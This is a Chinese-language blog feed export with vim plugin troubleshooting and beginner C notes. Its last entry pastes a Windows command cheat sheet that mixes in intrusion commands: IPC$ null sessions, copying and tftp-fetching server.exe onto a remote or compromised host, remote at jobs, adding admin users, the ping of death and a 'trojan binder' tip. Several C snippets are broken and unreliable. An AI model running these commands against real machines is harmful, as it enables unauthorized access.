      <url>/2019/09/02/vim-plug2/</url>
      
        <content type="html"><![CDATA[<h1 id="markdown-preview插件系列"><a href="#markdown-preview插件系列" class="headerlink" title="markdown-preview插件系列"></a>markdown-preview插件系列</h1><ul><li>折腾了很久发现可以用了，但是还是有一些问题<ol><li>只能在根目录下使用，而我绝大部分的编辑是在hexo中编辑blog</li><li>不能进入报错，某个rpc的依赖插件打不开</li></ol></li><li>解决方案<ol><li>换个插件</li><li>安装instant-markdown-d发现这些插件都有相同的问题在hexo中无法编辑bolg</li><li>发现我编辑的blog都是root用户的因为我每次打开都是sudo vim，但是这些插件打开浏览器firefox是我登录用户的，所以打不开。</li><li>当然我尝试了以下直接用firefox打开markdown，firefox安装了markdown文件的显示插件和自动重载页面，代码如下（改的vimrc文件）  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nnoremap &lt;leader&gt;t :call Preview() &lt;CR&gt;</span><br><span class="line">func! Preview()</span><br><span class="line">if &amp;filetype == &#x27;markdown&#x27; ||  &amp;filetype == &#x27;md&#x27;</span><br><span class="line">exec &quot;firefox %&quot;</span><br><span class="line">endif</span><br><span class="line">endfunc</span><br></pre></td></tr></table></figure></li><li>运行报错Running Firefox as root in a regular user’s session is not supported。我估计那两个插件没有料到我会遇到这样的问题，毕竟是浏览器打不开插件运行是正常的。</li><li>只能改掉blog目录下所有文件的拥有者  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R 我的用户名 blog目录</span><br></pre></td></tr></table></figure></li><li>重新进入可以使用了，一切恢复正常</li></ol></li></ul><h1 id="vim-plug插件管理器问题"><a href="#vim-plug插件管理器问题" class="headerlink" title="vim-plug插件管理器问题"></a>vim-plug插件管理器问题</h1><ul><li>大部分插件是可以直接安装的但是第一次安装失败后退出安装界面，再进入就显示安装完成了</li><li>怀疑是不是只检测是否有这个文件目录就算安装了插件</li><li>解决办法<ol><li>最有效的方式是  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">删除或者注释掉.vimrc中未安装成功的插件相关的内容</span><br><span class="line">执行:PlugClean清除插件（可能清除失败，目录没删掉）</span><br><span class="line">因为我用的是vim所以目录为~/.vim/plugged/中，删掉文件夹即可</span><br><span class="line">之后重新安装依赖或者重新安装</span><br></pre></td></tr></table></figure></li><li>直接找到依赖包安装，说不定插件是安装好的只是少依赖再或者就如markdown-preview中的问题，插件安装成功依赖也是完整的，只是用户组问题这样的bug插件本身无法检测也无任何报错导致插件打不开。（文档读着都累，而且markdown-preview还不知道怎么查文档的我，一步步慢慢试水分析原因浪费了大量时间）</li><li>依赖安装不成功很可能是依赖的环境变量没有设置好或者只是局部变量没办法在全局引用中查找到（所以安装中 -g 很重要）。再或者就是我之前的问题root用户和自己的用户在vim中未作区分，导致有些无法执行。有些就算区分了在vim中也没办法执行,下面的方法我用了之后可以在vim中使用firefox了，但是对插件你仍不知道去哪里改插件问题  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nnoremap &lt;leader&gt;t :call Preview() &lt;CR&gt;</span><br><span class="line">func! Preview()</span><br><span class="line">if &amp;filetype == &#x27;markdown&#x27; ||  &amp;filetype == &#x27;md&#x27;</span><br><span class="line">exec &quot;!sudo -u lmfalcon firefox %&quot;</span><br><span class="line">endif</span><br><span class="line">endfunc</span><br></pre></td></tr></table></figure></li></ol></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> plugin,vim,vim-plug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CLearning4</title>
      <link href="/2019/09/01/CLearning4/"/>
      <url>/2019/09/01/CLearning4/</url>
      
        <content type="html"><![CDATA[<h1 id="windows下运行c程序"><a href="#windows下运行c程序" class="headerlink" title="windows下运行c程序"></a>windows下运行c程序</h1><ol><li>建立1.c文件，内容如下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdlib&gt;</span><br><span class="line">&#123;</span><br><span class="line">system(&quot;mspaint&quot;)//打开画图板</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>打开命令行进入1.c文件位置：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cl /c 1.c//编译</span><br><span class="line">cl 1.c//链接</span><br><span class="line">1.exe//执行</span><br></pre></td></tr></table></figure></li></ol><h1 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h1><p>#include<stdio></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">int main()&#123;</span><br><span class="line">printf(&quot;helloworld&quot;);</span><br><span class="line">printf(&quot;\n\a&quot;);//换行\n\a发声</span><br><span class="line">printf(&quot;\b&quot;);//实现光标退格</span><br><span class="line">printf(&quot;\f&quot;);//文本编辑器是换页，dos命令行只是垃圾字符</span><br><span class="line">printf(&quot;\r&quot;);//\r移动到本行开头</span><br><span class="line">printf(&quot;\t&quot;);//往前移动几个空格</span><br><span class="line">printf(&quot;\v&quot;);//文本编辑器是垂直制表，dos只是垃圾字符</span><br><span class="line">printf(&quot;\0&quot;);//什么都不操作，\0有没有都一样</span><br><span class="line">getchar();</span><br><span class="line">printf(&quot;\\&quot;);//单斜杠</span><br><span class="line">printf(&quot;\&quot;&quot;);//一个双引号</span><br><span class="line">putchar(&#x27;h&#x27;);//输入一个字符</span><br><span class="line">putchar(104);//输出对应的ASCIIS码的字符</span><br><span class="line">putchar(&#x27;\xhh&#x27;);//代表一到两位十六进制输出对应ASCIIS的字符</span><br><span class="line">putchar(&#x27;\101&#x27;);//\ddd代表三位八进制</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="常量与变量"><a href="#常量与变量" class="headerlink" title="常量与变量"></a>常量与变量</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void main()&#123;</span><br><span class="line"></span><br><span class="line">int num = 10;</span><br><span class="line">printf(%d,%x&quot;,num, &amp;num);//%d是十进制，%x是十六进制，&amp;num是取num的地址</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">const int x = 100;//定义常量方法一</span><br><span class="line">#define X 100//定义常量方法二,define本质就是替换，如果define加上分好就会连分号一起复制</span><br><span class="line">//易语言就是define加上很多标识符实现的比如</span><br><span class="line">#define 主函数 main</span><br><span class="line">#define 返回值为空 void</span><br><span class="line"></span><br><span class="line">返回值为空 主函数()&#123;</span><br><span class="line">&#125;</span><br><span class="line">//上面的函数是可以编译的，因为define定义了，替换成标注的标识符</span><br></pre></td></tr></table></figure><h1 id="替换两个数的算法"><a href="#替换两个数的算法" class="headerlink" title="替换两个数的算法"></a>替换两个数的算法</h1><pre><code>int a = 100;int b = 10;//方法一a = a + b;b = a - b;a = a - b;//方法二a = a * b;b = a / b;a = a / b;//一般运用于节约内存的场合使用</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CLearning3</title>
      <link href="/2019/08/30/CLearning3/"/>
      <url>/2019/08/30/CLearning3/</url>
      
        <content type="html"><![CDATA[<h1 id="跨平台执行C"><a href="#跨平台执行C" class="headerlink" title="跨平台执行C"></a>跨平台执行C</h1><ul><li>int是整数类型便于跨平台执行</li></ul><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><h3 id="C文件"><a href="#C文件" class="headerlink" title="C文件"></a>C文件</h3><ul><li>gcc helloc.c生成a.out文件</li><li>.&#x2F;a.out执行a.out文件</li><li>用vi可以直接执行并生成helloc的可执行文件用.&#x2F;helloc可以直接执行</li></ul><h3 id="cpp文件"><a href="#cpp文件" class="headerlink" title="cpp文件"></a>cpp文件</h3><ul><li>g++ cpp.cc(c++的源文件.cc为后缀感觉好像和windows不一样啊) -o cpp.out</li><li>.&#x2F;cpp.out</li></ul><h3 id="eclipse"><a href="#eclipse" class="headerlink" title="eclipse"></a>eclipse</h3><ul><li>linux建议上使用</li></ul><h3 id="codeblocks"><a href="#codeblocks" class="headerlink" title="codeblocks"></a>codeblocks</h3><ul><li>linux上建议使用</li></ul><h3 id="Qt"><a href="#Qt" class="headerlink" title="Qt"></a>Qt</h3><ul><li>可以多平台运行，找到了linux版的但是.&#x2F;***.run文件打不开，下次尝试安装，现在windows下运行吧</li><li>android下运行C<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;android/log.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">__android_log-print(ANROID_LOGDEBUG,&quot;itcast&quot;,&quot;输入你想输入内容&quot;);//输出调试信息 itcast是头</span><br><span class="line">return 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h2 id="android开发"><a href="#android开发" class="headerlink" title="android开发"></a>android开发</h2><ul><li>先编写一个hello.c文件</li><li>之后编写Android.mk文件<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_PATH := $(call my-dir)</span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line">LOCAL_MODULE := hello</span><br><span class="line">LOCAL_SRC_FILES := hello.c</span><br><span class="line">LOCAL_LDLIBS:= -1log</span><br><span class="line">include $(BULID_EXECUABLE)</span><br></pre></td></tr></table></figure>….不写了，没工具</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CLearning2</title>
      <link href="/2019/08/30/CLearning2/"/>
      <url>/2019/08/30/CLearning2/</url>
      
        <content type="html"><![CDATA[<h1 id="MFCsystem"><a href="#MFCsystem" class="headerlink" title="MFCsystem"></a>MFCsystem</h1><h2 id="MFC"><a href="#MFC" class="headerlink" title="MFC"></a>MFC</h2><ul><li>一个快速构建窗口程序框架</li></ul><h2 id="system系统命令"><a href="#system系统命令" class="headerlink" title="system系统命令"></a>system系统命令</h2><ul><li>使用system命令都必须有以下省略<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdlib.h&gt;</span><br></pre></td></tr></table></figure></li><li>以下代码均为windows命令行</li><li>带路径的“应该处理为\”</li><li>\需要处理为\</li><li>64bit系统中（x86）前应该有一个空格，括号前要有空格</li><li>关闭进程<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">messageBoxA(0,&quot;禁止聊天&quot;,&quot;QQ提示&quot;,0);</span><br><span class="line">system(&quot;taskkill /f /i QQ.exe&quot;);///f表示强制关闭 /im 进程名</span><br></pre></td></tr></table></figure></li><li>打开网站<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;/&quot;浏览器路径(注意用双引号，注意转义)&quot; url（想关闭的网站）&quot;） </span><br></pre></td></tr></table></figure></li><li>关闭网站类似关闭进程</li><li>命令提示符指令并行<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;tasklist &amp; pause&quot;);</span><br></pre></td></tr></table></figure></li><li>导入命令行到文本（类似cat和重定向）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;tasklist &gt; C:\\X.txt &quot;)</span><br></pre></td></tr></table></figure></li><li>读取程序文本<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(type &quot;\&quot;路径&quot; &amp; pause&quot;)</span><br></pre></td></tr></table></figure></li><li>cmd窗口变色改变标题<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;color 4f &amp; title 标题 &amp; echo 内容 &amp; pause&quot;);</span><br></pre></td></tr></table></figure></li><li>打开音乐播放器<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;音乐路径&quot;);</span><br></pre></td></tr></table></figure></li><li>删除文件<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(del 文件);</span><br></pre></td></tr></table></figure></li><li>管理应用程序<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;appwiz.cpl&quot;);</span><br></pre></td></tr></table></figure></li><li>字符映射表<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;charmap&quot;);</span><br></pre></td></tr></table></figure></li><li>屏幕分辨率desk.cpl</li><li>优化驱动器dfrgui</li><li>电话拨号程序dialer</li><li>磁盘管理diskmgmt.msc</li><li>具体百度查询，这里剩下只列举常用命令及用法</li><li>DirectX信息检查 dxdiag用于检查例如手柄的使用是否正常</li><li>阻塞状态<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;calc&quot;);</span><br><span class="line">system(&quot;calc&quot;);</span><br><span class="line">system(&quot;calc&quot;);</span><br><span class="line">//以上状态阻塞</span><br><span class="line">//同步状态，等待这个程序关闭后执行下一步</span><br><span class="line">system(&quot;start calc / max &quot;);//最大化计算器没办法最大化和最小化，这里只是演示，指令可能过时，需要自己查找新指令</span><br><span class="line">system(&quot;start calc  / min &quot;);//最小化窗口</span><br><span class="line">system(&quot;start calc&quot;);</span><br><span class="line">//异步状态，同时执行三个程序</span><br></pre></td></tr></table></figure></li></ul><hr><ul><li>以下内容粘贴自百度，注释（使用#进行注释防止中英文频繁切换）视频中提到的用法</li></ul><ol><li>calc———–启动计算器</li><li>certmgr.msc—-证书管理实用程序</li><li>charmap——–启动字符映射表</li><li>chkdsk.exe—–Chkdsk磁盘检查</li><li>ciadv.msc——索引服务程序</li><li>cleanmgr——-垃圾整理</li><li>cliconfg——-SQL SERVER 客户端网络实用程序</li><li>Clipbrd——–剪贴板查看器</li><li>cmd.exe——–CMD命令提示符</li><li>compmgmt.msc—计算机管理</li><li>conf———–启动netmeeting</li><li>dcomcnfg——-打开系统组件服务</li><li>ddeshare——-打开DDE共享设置</li><li>devmgmt.msc— 设备管理器</li><li>dfrg.msc——-磁盘碎片整理程序</li><li>diskmgmt.msc—磁盘管理实用程序</li><li>drwtsn32—— 系统医生</li><li>dvdplay——–DVD播放器</li><li>dxdiag———检查DirectX信息</li><li>explorer——-打开资源管理器</li><li>eudcedit——-造字程序# 字体设计</li><li>eventvwr——-事件查看器# 查看系统和应用日志信息</li><li>fsmgmt.msc—–共享文件夹管理器# 共享文件信息，可能会对系统磁盘中造成破坏</li><li>gpedit.msc—–组策略# 控制不同用户组的权限，例如公司电脑U盘不能拷贝的问题</li><li>iexpress——-木马捆绑工具，系统自带# 捆绑程序，随exe文件的打开自动运行</li><li>logoff———注销命令</li><li>lusrmgr.msc—-本机用户和组</li><li>notepad——–打开记事本</li><li>magnify——–放大镜实用程序# 老花辅助程序</li><li>mem.exe——–显示内存使用情况</li><li>mmc————打开控制台49.</li><li>mobsync——–同步命令</li><li>mplayer2——-简易widnows media player</li><li>Msconfig.exe—系统配置实用程序</li><li>mspaint——–画图板</li><li>mstsc———-远程桌面连接# 远程控制</li><li>narrator——-屏幕“讲述人”# 盲人电脑设置</li><li>net start messenger—-开始信使服务</li><li>netstat -an—-(TC)命令检查接口</li><li>net stop messenger—–停止信使服务</li><li>Nslookup——-IP地址侦测器 ，是一个监测网络中 DNS 服务器是否能正确实现域名解析的命令行工具.<br>它在Windows NT&#x2F;2000&#x2F;XP中均可使用，但在 Windows 98 中却没有集成这一个工具。</li><li>ntbackup——-系统备份和还原</li><li>ntmsmgr.msc—-移动存储管理器</li><li>ntmsoprq.msc—移动存储管理员操作请求</li><li>odbcad32——-ODBC数据源管理器</li><li>oobe&#x2F;msoobe &#x2F;a—-检查XP是否激活</li><li>osk————打开屏幕键盘</li><li>packager——-对象包装程序</li><li>perfmon.msc—-计算机性能监测程序</li><li>progman——–程序管理器</li><li>regedit.exe—-注册表</li><li>regedt32——-注册表编辑器</li><li>regsvr32 &#x2F;u *.dll—-停止dll文件运行</li><li>regsvr32 &#x2F;u zipfldr.dll——取消ZIP支持</li><li>rononce -p—-15秒关机</li><li>rsop.msc——-组策略结果集</li><li>secpol.msc—–本地安全策略</li><li>services.msc—本地服务设置</li><li>sfc.exe——–系统文件检查器</li><li>sfc &#x2F;scannow—–扫描错误并复原</li><li>sfc &#x2F;scannow—windows文件保护</li><li>shrpubw——–创建共享文件夹</li><li>shutdown——-60秒倒计时关机命令</li><li>sigverif——-文件签名验证程序</li><li>sndrec32——-录音机</li><li>Sndvol32——-音量控制程序</li><li>syncapp——–创建一个公文包</li><li>sysedit——–系统配置编辑器</li><li>syskey———系统加密，一旦加密就不能解开，保护windows xp系统的双重密码</li><li>taskmgr——–任务管理器</li><li>tourstart——xp简介（安装完成后出现的漫游xp程序）</li><li>utilman——–辅助工具管理器</li><li>wiaacmgr——-扫描仪和照相机向导</li><li>winchat——–XP自带局域网聊天</li><li>winmsd———系统信息</li><li>winver———检查Windows版本</li><li>write———-写字板</li><li>wmimgmt.msc—-打开windows管理体系结构（WMI)</li><li>wscript——–windows脚本宿主设置</li><li>wupdmgr——–windows更新程序<br>操作详解<br>编辑<br>net use ipipc$ “ “ &#x2F;user:” “ 建立IPC空链接<br>net use ipipc$ “密码” &#x2F;user:”用户名” 建立IPC非空链接<br>net use h: ipc$ “密码” &#x2F;user:”用户名” 直接登陆后映射对方C：到本地为H:<br>net use h: ipc$ 登陆后映射对方C：到本地为H:<br>net use ipipc$ &#x2F;del 删除IPC链接<br>net use h: &#x2F;del 删除映射对方到本地的为H：的映射<br>net user 用户名　密码　&#x2F;add 建立用户<br>net user guest &#x2F;active:yes 激活guest用户<br>net user 查看有哪些用户<br>net user 帐户名 查看帐户的属性<br>net localgroup administrators 用户名 &#x2F;add 把“用户”添加到管理员中使其具有管理员权限<br>net start 查看开启了哪些服务<br>net start 服务名　开启服务；（如：net start telnet， net start schedule)<br>net stop 服务名 停止某服务<br>net time 目标ip 查看对方时间<br>net time 目标ip &#x2F;set 设置本地计算机时间与“目标IP”主机的时间同步，加上参数&#x2F;yes可取消确认信息<br>net view 查看本地局域网内开启了哪些共享<br>net view ip 查看对方局域网内开启了哪些共享<br>net config 显示系统网络设置<br>net logoff 断开连接的共享<br>net pause 服务名 暂停某服务<br>net send ip “文本信息” 向对方发信息<br>net ver 局域网内正在使用的网络连接类型和信息<br>net share 查看本地开启的共享<br>net share ipc$ 开启ipc$共享<br>net share ipc$ &#x2F;del 删除ipc$共享<br>net share c$ &#x2F;del 删除C：共享<br>net user guest 12345 用guest用户登陆后用将密码改为12345<br>net password 密码 更改系统登陆密码<br>netstat -a 查看开启了哪些端口，常用netstat -an<br>netstat -n 查看端口的网络连接情况，常用netstat -an<br>netstat -v 查看正在进行的工作<br>netstat -p 协议名 例：netstat -p tcq&#x2F;ip 查看某协议使用情况<br>netstat -s 查看正在使用的所有协议使用情况<br>nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名<br>tracert -参数 ip(或计算机名） 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。# 用于监视（黑客常用指令）<br>ping ip（或域名） 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。<br>ping -t -l 65500 ip 死亡之ping（发送大于64K的文件并一直ping就成了死亡之ping)<br>ipconfig (winipcfg) 用于windows NT及XP(windows 95 98）查看本地ip地址，ipconfig可用参数“&#x2F;all”显示全部配置信息<br>tlist -t 以树行列表显示进程（为系统的附加工具，默认是没有安装的，在安装目录的Support&#x2F;tools文件夹内）<br>kill -F 进程名 加-F参数后强制结束某进程（为系统的附加工具，默认是没有安装的，在安装目录的Support&#x2F;tools文件夹内）<br>del -F 文件名 加-F参数后就可删除只读文件,&#x2F;AR、&#x2F;AH、&#x2F;AS、&#x2F;AA分别表示删除只读、隐藏、系统、存档文件，&#x2F;A-R、&#x2F;A-H、&#x2F;A-S、&#x2F;A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL&#x2F;AR *.<em>”表示删除当前目录下所有只读文件，“DEL&#x2F;A-S <em>.<em>”表示删除当前目录下除系统文件以外的所有文件<br>del &#x2F;S &#x2F;Q 目录 或用：rmdir &#x2F;s &#x2F;Q 目录 &#x2F;S删除目录及目录下的所有子目录和文件。同时使用参数&#x2F;Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）<br>move 盘符路径要移动的文件名　存放移动文件的路径移动后文件名 移动文件，用参数&#x2F;y将取消确认移动目录存在相同文件的提示就直接覆盖<br>fc one.txt two.txt &gt; 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，”&gt; “和”&gt; &gt;” 是重定向命令<br>at id号 开启已注册的某个计划任务<br>at &#x2F;delete 停止所有计划任务，用参数&#x2F;yes则不需要确认就直接停止<br>at id号 &#x2F;delete 停止某个已注册的计划任务<br>at 查看所有的计划任务<br>at ip time 程序名（或一个命令） &#x2F;r 在某时间运行对方某程序并重新启动计算机<br>finger username @host 查看最近有哪些用户登陆<br>telnet ip 端口 远程登陆服务器，默认端口为23<br>open ip 连接到IP（属telnet登陆后的命令）<br>telnet 在本机上直接键入telnet 将进入本机的telnet<br>copy 路径文件名1　路径文件名2 &#x2F;y 复制文件1到指定的目录为文件2，用参数&#x2F;y就同时取消确认你要改写一份现存目录文件<br>copy c:srv.exe ipadmin$ 复制本地c:srv.exe到对方的admin下<br>copy 1st.jpg&#x2F;b+2st.txt&#x2F;a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：&#x2F;b指二进制文件，&#x2F;a指ASCLL格式文件<br>copy ipadmin$svv.exe c: 或：copyipadmin$</em>.</em> 复制对方admini$共享下的srv.exe文件（所有文件）至本地C：<br>xcopy 要复制的文件或目录树　目标地址目录名 复制文件和目录树，用参数&#x2F;Y将不提示覆盖相同文件<br>用参数&#x2F;e才可连目录下的子目录一起复制到目标地址下。<br>tftp -i 自己IP（用肉机作跳板时这用肉机IP) get server.exec:server.exe 登陆后，将“IP”的server.exe下载到目标主机c:server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送<br>tftp -i 对方IP　put c:server.exe 登陆后，上传本地c:server.exe至主机<br>ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送（文本文件时）<br>route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface# 用于查看当前路由器的用户信息<br>arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息<br>start 程序名或命令 &#x2F;max 或&#x2F;min 新开一个新窗口并最大化（最小化）运行某程序或命令<br>mem 查看cpu使用情况<br>attrib 文件名（目录名） 查看某文件（目录）的属性<br>attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉（添加）某文件的 存档，只读，系统，隐藏 属性；用+则是添加为某属性<br>dir 查看文件，参数：&#x2F;Q显示文件及目录属系统哪个用户，&#x2F;T:C显示文件创建时间，&#x2F;T:A显示文件上次被访问时间，&#x2F;T:W上次被修改时间<br>date &#x2F;t 、 time &#x2F;t 使用此参数即“DATE&#x2F;T”、“TIME&#x2F;T”将只显示当前日期和时间，而不必输入新日期和时间<br>set 指定环境变量名称&#x3D;要指派给变量的字符 设置环境变量<br>set 显示当前所有的环境变量<br>set p（或其它字符） 显示出当前以字符p（或其它字符）开头的所有环境变量<br>pause 暂停批处理程序，并显示出：请按任意键继续….<br>if 在批处理程序中执行条件处理（更多说明见if命令及变量）<br>goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）<br>call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call &#x2F;?）<br>for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）<br>echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置<br>echo 信息 在屏幕上显示出信息<br>echo 信息 &gt;&gt; pass.txt 将”信息”保存到pass.txt文件中<br>findstr “Hello” aa.txt 在aa.txt文件中寻找字符串hello<br>find 文件名 查找某文件<br>title 标题名字 更改CMD窗口标题名字<br>color 颜色值 设置cmd控制台前景和背景颜色；0&#x3D;黑、1&#x3D;蓝、2&#x3D;绿、3&#x3D;浅绿、4&#x3D;红、5&#x3D;紫、6&#x3D;黄、7&#x3D;白、8&#x3D;灰、9&#x3D;淡蓝、A&#x3D;淡绿、B&#x3D;淡浅绿、C&#x3D;淡红、D&#x3D;淡紫、E&#x3D;淡黄、F&#x3D;亮白<br>prompt 名称 更改cmd.exe的显示的命令提示符（把C：、D：统一改为：EntSky )<br>ver 在DOS窗口下显示版本信息<br>winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）<br>format 盘符 &#x2F;FS：类型 格式化磁盘，类型：FAT、FAT32、NTFS,例：Format D: &#x2F;FS:NTFS<br>md　目录名 创建目录<br>replace 源文件　要替换文件的目录 替换文件<br>ren 原文件名　新文件名 重命名文件名<br>tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称<br>type 文件名 显示文本文件的内容#不适用于大数据<br>more 文件名 逐屏显示输出文件# 查看大数据文件，防止一次性读入过多数据，解决内存占用问题<br>doskey 要锁定的命令&#x3D;字符<br>doskey 要解锁命令&#x3D; 为DOS提供的锁定命令（编辑命令行，重新调用win2k命令，并创建宏）。如：锁定dir命令：doskey dir&#x3D;entsky （不能用doskey dir&#x3D;dir）；解锁：doskey dir&#x3D;<br>taskmgr 调出任务管理器<br>chkdsk &#x2F;F D: 检查磁盘D并显示状态报告；加参数&#x2F;f并修复磁盘上的错误<br>tlntadmn telnt服务admn，键入tlntadmn选择3，再选择8，就可以更改telnet服务默认端口23为其它任何端口<br>exit 退出cmd.exe程序或目前，用参数&#x2F;B则是退出当前批处理脚本而不是cmd.exe<br>path 路径可执行文件的文件名 为可执行文件设置一个路径。<br>cmd 启动一个win2K命令解释窗口。参数：&#x2F;eff、&#x2F;en 关闭、开启命令扩展；更我详细说明见cmd &#x2F;?<br>regedit &#x2F;s 注册表文件名 导入注册表；参数&#x2F;S指安静模式导入，无任何提示；<br>regedit &#x2F;e 注册表文件名 导出注册表<br>cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：&#x2F;D 用户名：设定拒绝某用户访问；&#x2F;P 用户名：perm 替换指定用户的访问权限；&#x2F;G 用户名：perm 赋予指定用户访问权限；Perm 可以是： N 无，R 读取， W 写入， C 更改（写入），F 完全控制；例：cacls D: est.txt &#x2F;D pub 设定d: est.txt拒绝pub用户访问。<br>cacls 文件名 查看文件的访问用户权限列表<br>REM 文本内容 在批处理文件中添加注解<br>netsh 查看或更改本地网络配置情况<br>IIS服务命令<br>iisreset &#x2F;reboot 重启win2k计算机（但有提示系统将重启信息出现）<br>iisreset &#x2F;start或stop 启动（停止）所有Internet服务<br>iisreset &#x2F;restart 停止然后重新启动所有Internet服务<br>iisreset &#x2F;status 显示所有Internet服务状态<br>iisreset &#x2F;enable或disable 